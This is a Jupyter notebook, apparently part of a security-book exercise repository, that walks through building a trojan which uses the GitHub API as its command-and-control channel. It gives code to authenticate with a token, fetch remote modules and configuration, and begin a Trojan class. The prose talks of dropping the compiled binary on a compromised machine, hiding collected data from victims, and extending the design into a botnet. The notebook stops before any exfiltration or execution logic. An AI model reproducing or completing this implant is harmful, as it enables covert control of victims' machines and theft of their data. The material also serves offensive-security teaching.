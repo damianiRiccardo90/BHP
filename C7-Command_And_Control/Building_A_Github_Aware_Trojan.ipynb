{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyP5Zq1BA7J5nVunjpdYrCqX",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C7-Command_And_Control/Building_A_Github_Aware_Trojan.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Building a Github-Aware Trojan__*\n",
        "\n",
        "The main trojan will retrieve configuration options and code to run from Github. Let's start by writing the functions that connect and authenticate to the Github API and then communicate with it. Open a new file called __git_trojan.py__ and enter the following:"
      ],
      "metadata": {
        "id": "OyvLc487Wpl1"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import base64\n",
        "import github3\n",
        "import importlib\n",
        "import json\n",
        "import random\n",
        "import sys\n",
        "import threading\n",
        "import time\n",
        "\n",
        "from datetime import datetime"
      ],
      "metadata": {
        "id": "JwM2uWWQXBCm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "This simple setup code contains the necessary imports, which should keep our overall trojan size relatively small when compiled. We say __relatively__ because most compiled Python binaries using __pyinstaller__ are around __7MB__. (You can check out __pyinstaller__ here: https://www.pyinstaller.org/downloads.html). We'll drop this binary on the compromised machine.\n",
        "\n",
        "If you were to explode this technique to build a full __botnet__ (a network of many such implants), you'd want the ability to automatically generate trojans, set their ID, create a configuration file that's pushed to Github, and compile the trojan into an executable. We won't build a botnet today, though; we'll let your imagination do the work.\n",
        "\n",
        "Now let's put the relevant Github code in place:"
      ],
      "metadata": {
        "id": "tj6Z-ulRXVLT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def github_connect(): #[1]\n",
        "    with open('mytoken.txt') as f:\n",
        "        token = f.read()\n",
        "    user = 'tiarno'\n",
        "    sess = github3.login(token=token)\n",
        "    return sess.repository(user, 'bhptrojan')\n",
        "\n",
        "def get_file_contents(dirname, module_name, repo): #[2]\n",
        "    return repo.file_contents(f'{dirname}/{module_name}').content"
      ],
      "metadata": {
        "id": "74BBUIMlYcMH"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "These two functions handle the interaction with the Github repository. The __github_connect__ function reads the token created on Github __[1]__. When you created the token, you wrote it to a file called __mytoken.txt__. Now we read the token from that file and return a connection to the Github repository. You may want to create different tokens for different trojans so you can control what each trojan can access in your repository. That way, if victims catch your trojan, they can't come along and delete all of your retrieved data.\n",
        "\n",
        "The __get_file_contents__ function receives the directory name, module name, and repository connection and returns the contents of the specified module __[2]__. This function is responsible for grabbing files from the remote repo and reading the contents in locally. We'll use it for reading both configuration options and the module source code.\n",
        "\n",
        "Now we will create a __Trojan__ class that performs the essential trojaning tasks:"
      ],
      "metadata": {
        "id": "ZwohheNWZRJj"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Trojan:\n",
        "    def __init__(self, id): #[1]\n",
        "        self.id = id\n",
        "        self.config_file = f'{id}.json'\n",
        "        self.data_path = f'data/{id}/' #[2]\n",
        "        self.repo = github_connect() #[3]"
      ],
      "metadata": {
        "id": "WCo4BniUbA6K"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}